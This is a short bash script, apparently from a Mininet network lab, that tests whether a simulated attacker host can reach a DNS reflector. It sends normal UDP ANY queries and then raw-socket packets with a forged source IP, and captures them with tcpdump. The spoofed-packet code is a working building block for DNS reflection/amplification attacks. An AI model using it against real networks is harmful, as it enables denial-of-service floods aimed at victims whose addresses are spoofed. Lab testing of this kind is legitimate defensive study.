#!/bin/bash
set -u
pidof_host(){ pgrep -f "is mininet:$1" | head -1; }
ATK=$(pidof_host attacker); DNS=$(pidof_host dnsserver)
echo "ATK=$ATK DNS=$DNS"
echo "=== 1) ping L3 attacker->reflector ==="
mnexec -a $ATK ping -c2 -W2 10.10.0.13 2>&1 | tail -3
echo "=== 2) UDP NO-spoofed attacker->reflector:53 (source real 10.10.0.99) ==="
mnexec -a $DNS timeout 5 tcpdump -i any -n 'udp port 53' 2>/dev/null > /tmp/nsp.txt &
sleep 1
mnexec -a $ATK python3 -c "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);q=b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01';[s.sendto(q,('10.10.0.13',53)) for _ in range(5)];print('enviados 5 UDP normales (source real)')"
sleep 3
echo "  reflector recibio (no-spoof): $(grep -c 'IP ' /tmp/nsp.txt 2>/dev/null || echo 0) paquetes"
grep 'IP ' /tmp/nsp.txt 2>/dev/null | head -3
echo "=== 3) UDP SPOOFED (raw socket, source=10.10.1.50) attacker->reflector:53 ==="
mnexec -a $DNS timeout 5 tcpdump -i any -n 'udp port 53' 2>/dev/null > /tmp/sp.txt &
sleep 1
mnexec -a $ATK python3 -c "
import socket,struct
def ipu(src,dst,pl):
 return struct.pack('!BBHHHBBH4s4s',0x45,0,20+pl,1,0,64,17,0,socket.inet_aton(src),socket.inet_aton(dst))
def udp(sp,dp,d):
 return struct.pack('!HHHH',sp,dp,8+len(d),0)+d
q=b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01'
try:
 s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_UDP);s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
 for i in range(5): s.sendto(ipu('10.10.1.50','10.10.0.13',len(q)+8)+udp(30000,53,q),('10.10.0.13',53))
 print('enviados 5 UDP SPOOFED (source 10.10.1.50)')
except OSError as e:
 print('RAW SOCKET FALLO:',e)
"
sleep 3
echo "  reflector recibio (spoofed): $(grep -c 'IP ' /tmp/sp.txt 2>/dev/null || echo 0) paquetes"
grep 'IP ' /tmp/sp.txt 2>/dev/null | head -3
